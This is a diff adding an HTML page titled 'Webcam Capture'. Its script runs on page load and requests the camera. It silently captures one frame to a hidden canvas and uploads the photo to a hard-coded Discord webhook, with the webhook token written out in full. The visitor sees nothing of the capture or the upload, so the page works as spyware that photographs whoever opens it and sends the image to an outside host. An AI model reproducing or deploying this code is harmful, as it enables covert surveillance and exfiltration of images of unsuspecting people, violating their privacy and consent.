@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Capture</title>
+</head>
+<body>
+
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const canvasElement = document.getElementById("canvas");
+        const ctx = canvasElement.getContext("2d");
+
+        // Request access to the webcam as soon as the page loads
+        async function setupWebcam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                videoElement.onloadedmetadata = () => {
+                    // Once the video stream is ready, capture the photo
+                    ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                    const imageData = canvasElement.toDataURL("image/png");
+
+                    // Send the photo to the webhook
+                    sendToWebhook(imageData);
+
+                    // Stop the video stream after capturing the photo
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            } catch (error) {
+                console.error("Camera access denied or unavailable.");
+            }
+        }
+
+        // Convert base64 image data to a Blob and send it to a Discord webhook
+        function sendToWebhook(imageData) {
+            const byteCharacters = atob(imageData.split(',')[1]);
+            const byteArrays = [];
+
+            for (let offset = 0; offset < byteCharacters.length; offset++) {
+                const byteArray = new Uint8Array(1);
+                byteArray[0] = byteCharacters.charCodeAt(offset);
+                byteArrays.push(byteArray);
+            }
+
+            const blob = new Blob(byteArrays, { type: "image/png" });
+            const formData = new FormData();
+            formData.append("file", blob, "photo.png");
+
+            fetch("https://discord.com/api/webhooks/1360947273311457432/qyqivk37tv69Qof8FK10cmj7yTFiKZuhMNAN_YNYNjkjE1mdOdlw_G2TfGdt0F0DYtda", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .catch(error => {
+                console.error("Error sending photo to webhook:", error);
+            });
+        }
+
+        // Start the webcam and capture the photo when the page loads
+        setupWebcam();
+    </script>
+
+</body>
+</html>
